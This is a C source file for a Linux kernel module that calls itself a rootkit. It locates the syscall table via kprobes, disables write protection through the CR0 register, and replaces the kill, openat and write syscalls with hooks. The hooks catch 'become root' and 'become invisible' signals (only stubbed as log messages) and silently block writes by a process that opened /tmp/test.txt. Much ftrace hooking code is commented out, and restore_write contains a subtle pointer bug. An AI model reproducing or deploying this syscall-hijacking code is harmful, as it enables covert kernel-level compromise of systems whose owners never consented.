/*
 Works for kernel versions >= (4,17,0)
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/dirent.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/ftrace.h>

#include <linux/list.h>

// Syscall table address pointer
unsigned long *__sys_call_table_addr;

//static struct nf_hook_ops nfho;
unsigned int target_fd = 0;
unsigned int target_pid = 0;

// Structure that represents ftrace hook
struct ftrace_hook {
    const char *name;
    void *function;
    struct ftrace_ops ops;
};

enum signals {
    SIGSUPER = 64, // Become root
    SIGINVIS = 63, // Become invisible
};

//LIST_HEAD(hook_list);

// Using kprobes method for getting syscall table address for new versions of kernel
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)

#include <linux/kprobes.h>
#define KPROBE_ 1

static unsigned long lookup_name(const char *name)
{
    struct kprobe kp = {
		.symbol_name = name
	};

    unsigned long ret_value;

    if (register_kprobe(&kp) < 0) return 0;

    ret_value = (unsigned long) kp.addr;
    unregister_kprobe(&kp);

    return ret_value;
}

#else

static unsigned long lookup_name(const char *name)
{
    return kallsyms_lookup_name(name);
}

#endif

//#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
//
//#define ftrace_regs pt_regs
//
//static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs)
//{
//    return fregs;
//}
//
//#endif

#ifdef KPROBE_

// Defining kprobe for syscall_table (should be replaced with function above)
typedef unsigned long (* kallsyms_lookup_name_t)(const char* name);

static struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
};

#endif

// Using cr0 register for changing permission of syscall table to rw, for x86 architecture only
#ifdef CONFIG_X86

#include <asm/paravirt.h>
#define PTREGS_MODIF

// For new versions of kernel ptregs_t type serves as a syscall wrapepr
typedef asmlinkage long (*syscall_wrapper)(const struct pt_regs *regs);

static syscall_wrapper orig_kill;
static syscall_wrapper orig_sys_openat;
static syscall_wrapper orig_sys_write;

static inline void write_forced_cr0(unsigned long value)
{
    unsigned long __force_order;

    asm volatile("mov %0,%%cr0":"+r"(value),"+m"(__force_order));
}

static void unprotect_memory(void)
{
    write_forced_cr0(read_cr0() & ~0x10000);
    pr_info("Unprotected memory\n");
}

static void protect_memory(void)
{
    write_forced_cr0(read_cr0() | 0x10000);
    pr_info("Protected memory\n");
}

#endif

// Modified syscalls
#ifdef PTREGS_MODIF

//#define SYSCALL_NAME(name) ("__x64_" name)
//
//#define FTRACE_HOOK(_name, _original_function, _modified_function)          \
//    {                                                                       \
//        .name = SYSCALL_NAME(_name),                                        \
//        .original_function = (_original_function),                          \
//        .modified_function = (_modified_function),                          \
//    }

static asmlinkage long hack_kill_syscall(const struct pt_regs* regs)
{
    int sig = regs->si;

    if (sig == SIGSUPER) {
        printk("Signal 64 was intercepted | became root");
        return 0;
    } else if (sig == SIGINVIS) {
        printk("Signal 63 was intercepted | became invisible");
        return 0;
    }

    return orig_kill(regs);
}

static char *duplicate_filename(const char __user *filename)
{
    char *kernel_filename;

    kernel_filename = kmalloc(4096, GFP_KERNEL);
    if (!kernel_filename) return NULL;

    if (strncpy_from_user(kernel_filename, filename, 4096) < 0) {
        kfree(kernel_filename);
        return NULL;
    }

    return kernel_filename;
}

static asmlinkage long fh_sys_write(struct pt_regs *regs)
{
	long ret;
	struct task_struct *task = current;

	if (task->pid == target_pid) {
        pr_info("writing to a file with descriptor %d\n", target_fd);

		if (regs->di + 1 == target_fd) {
            printk(KERN_INFO "Target has been killed\n");
            return 0;
        }
    }

	return orig_sys_write(regs);
}

static asmlinkage long fh_sys_openat(struct pt_regs *regs)
{
	long ret;
	char *kernel_filename;
	struct task_struct *task;
	task = current;

	kernel_filename = duplicate_filename((void*) regs->si);

	if (strncmp(kernel_filename, "/tmp/test.txt", 13) == 0) {
		pr_info("our file is opened by process with id: %d\n", task->pid);
		pr_info("opened file : %s\n", kernel_filename);
		kfree(kernel_filename);
		ret = orig_sys_openat(regs);
		pr_info("fd returned is %ld\n", ret);
		target_fd = ret;
		target_pid = task->pid;
		return ret;
	}

	kfree(kernel_filename);
	ret = orig_sys_openat(regs);

	return ret;
}

#endif

// Working with syscalls

static void store_kill(void)
{
    orig_kill = (syscall_wrapper)__sys_call_table_addr[__NR_kill];
}


static void hook_kill(void)
{
    __sys_call_table_addr[__NR_kill] = (unsigned long)&hack_kill_syscall;
}


static void restore_kill(void)
{
    /* Restore syscall table */
    __sys_call_table_addr[__NR_kill] = (unsigned long)orig_kill;
}

static void store_openat(void)
{
    orig_sys_openat = (syscall_wrapper)__sys_call_table_addr[__NR_openat];
}


static void hook_openat(void)
{
    __sys_call_table_addr[__NR_openat] = (unsigned long)&fh_sys_openat;
}


static void restore_openat(void)
{
    /* Restore syscall table */
    __sys_call_table_addr[__NR_openat] = (unsigned long)orig_sys_openat;
}

static void store_write(void)
{
    orig_sys_write = (syscall_wrapper)__sys_call_table_addr[__NR_write];
}


static void hook_write(void)
{
    __sys_call_table_addr[__NR_write] = (unsigned long)&fh_sys_write;
}


static void restore_write(void)
{
    /* Restore syscall table */
    __sys_call_table_addr[__NR_write] = (unsigned long)&orig_sys_write;
}

//static int save_original_ftraceh(struct ftrace_hook *hook)
//{
//    hook->address = lookup_name(hook->name);
//
//    if (!hook->address) {
//        pr_debug("unresolved symbol: %s\n", hook->name);
//        return -ENOENT;
//    }
//
//    *((unsigned long*) hook->original_function) = hook->address;
//
//    return 0;
//}
//
//static void notrace create_callback(unsigned long ip, unsigned long parent_ip,
//                                    struct ftrace_ops *ops, struct ftrace_regs *fregs)
//{
//    struct pt_regs *regs = ftrace_get_regs(fregs);
//    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
//
//    if (!within_module(parent_ip, THIS_MODULE))
//        regs->ip = (unsigned long)hook->modified_function;
//}
//
//static int register_ftrace_hook(struct ftrace_hook *hook)
//{
//    if (save_original_ftraceh(hook) != 0) return -1;
//
//    hook->ops.func = create_callback;
//    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
//                      | FTRACE_OPS_FL_RECURSION
//                      | FTRACE_OPS_FL_IPMODIFY;
//
//    int err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
//
//    if (err) {
//        pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
//        return err;
//    }
//
//    err = register_ftrace_function(&hook->ops);
//    if (err) {
//        pr_debug("register_ftrace_function() failed: %d\n", err);
//        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
//        return err;
//    }
//
////    list_add(&hook->list, &hook_list);
//
//    return 0;
//}
//
//void fh_remove_hook(struct ftrace_hook *hook)
//{
//    int err;
//
//    err = unregister_ftrace_function(&hook->ops);
//    if (err) {
//        pr_debug("unregister_ftrace_function() failed: %d\n", err);
//    }
//
//    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
//    if (err) {
//        pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
//    }
//}
//
//void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
//{
////    struct ftrace_hook *h, *tmp;
////
////    list_for_each_entry(h, &hook_list, list) {
////        int err = unregister_ftrace_function(&h->ops);
////        if (err) pr_debug("unregister_ftrace_function() failed: %d\n", err);
////
////        ftrace_set_filter_ip(&h->ops, h->address, 1, 0);
////    }
////
////    msleep(5);
////
////    list_for_each_entry_safe(h, tmp, &hook_list, list) {
////        list_del(&h->list);
////        kfree(h);
////    }
//
//    size_t i;
//
//    for (i = 0; i < count; i++)
//        fh_remove_hook(&hooks[i]);
//}
//
//int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
//{
////    struct ftrace_hook *hook_entry;
////    int err;
////
////    list_for_each_entry(hook_entry, &hook_list, list) {
////        err = register_ftrace_function(&hook_entry->ops);
////
////        if (err) {
////            fh_remove_hooks();
////        }
////    }
//
//    int err;
//    size_t i;
//
//    for (i = 0; i < count; i++) {
//        err = register_ftrace_hook(&hooks[i]);
//        if (err) {
//            while (i != 0) {
//                fh_remove_hook(&hooks[--i]);
//            }
//            return err;
//        }
//    }
//
//    return 0;
//}

//static struct ftrace_hook demo_hooks[] = {
//        FTRACE_HOOK("sys_write", &orig_sys_write, fh_sys_write),
//        FTRACE_HOOK("sys_openat", &orig_sys_openat, fh_sys_openat)
//};

// Function that launches when module is inserted
static int __init mod_init(void)
{
    pr_info("rootkit: started\n");

#ifdef KPROBE_

    int ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("[monitor] register_kprobe failed, returned %d\n", ret);
        return ret;
    }

    pr_info("[monitor] kprobe registered. kallsyms_lookup_name found at 0x%px\n",
            kp.addr);

    kallsyms_lookup_name_t kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;

    unregister_kprobe(&kp);

#endif

    __sys_call_table_addr = (unsigned long *) kallsyms_lookup_name("sys_call_table");

    store_kill();
    store_openat();
    store_write();
    unprotect_memory();

    hook_kill();
    hook_openat();
    hook_write();
    protect_memory();

//    struct ftrace_hook write_hook = FTRACE_HOOK("sys_write", &orig_sys_write, fh_sys_write);
//    struct ftrace_hook openat_hook = FTRACE_HOOK("sys_openat", &orig_sys_openat, fh_sys_openat);
//
//    list_add(&write_hook.list, &hook_list);
//    list_add(&openat_hook.list, &hook_list);

//    int err;
//
//    err = fh_install_hooks(demo_hooks, ARRAY_SIZE(demo_hooks));
//    if (err)
//        return err;
//
//    pr_info("module loaded\n");

    return 0;
}


// Function that launches when module is released
static void __exit mod_exit(void)
{
    pr_info("rootkit: exited\n");

    unprotect_memory();
    restore_kill();
    restore_openat();
    restore_write();
    protect_memory();

//    fh_remove_hooks(demo_hooks, ARRAY_SIZE(demo_hooks));
//
//    pr_info("module unloaded\n");
}


MODULE_LICENSE("GPL");
module_init(mod_init);
module_exit(mod_exit);